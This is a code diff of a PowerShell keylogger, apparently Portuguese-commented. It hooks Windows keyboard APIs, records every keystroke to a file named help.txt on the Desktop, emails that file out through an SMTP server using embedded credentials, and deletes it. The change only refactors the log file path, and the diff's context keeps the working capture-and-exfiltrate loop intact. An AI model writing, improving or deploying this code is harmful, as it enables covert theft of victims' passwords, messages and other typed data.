@@ -27,7 +27,9 @@ $SMTPPort = "587"
 $credentials = New-Object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 
 # Requer PowerShell versão 2
-function Start-Helper($Path="$env:USERPROFILE\Desktop\help.txt") {
+function Start-Helper {
+    $DesktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'help.txt')
+    
     $signatures = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
@@ -41,7 +43,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
     $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
-    $null = New-Item -Path $Path -ItemType File -Force
+    $null = New-Item -Path $DesktopPath -ItemType File -Force
 
     try {
         while ($true) {
@@ -66,13 +68,13 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
                         $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
 
                         if ($success) {
-                            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
+                            [System.IO.File]::AppendAllText($DesktopPath, $mychar, [System.Text.Encoding]::Unicode)
                         }
                     }
                 }
             }
-            Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachments $Path -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
-            Remove-Item -Path $Path -Force
+            Send-MailMessage -From $From -To $To -Subject $Subject -Body $body -Attachments $DesktopPath -SmtpServer $SMTPServer -Port $SMTPPort -Credential $credentials -UseSsl
+            Remove-Item -Path $DesktopPath -Force
         }
     }
     finally {
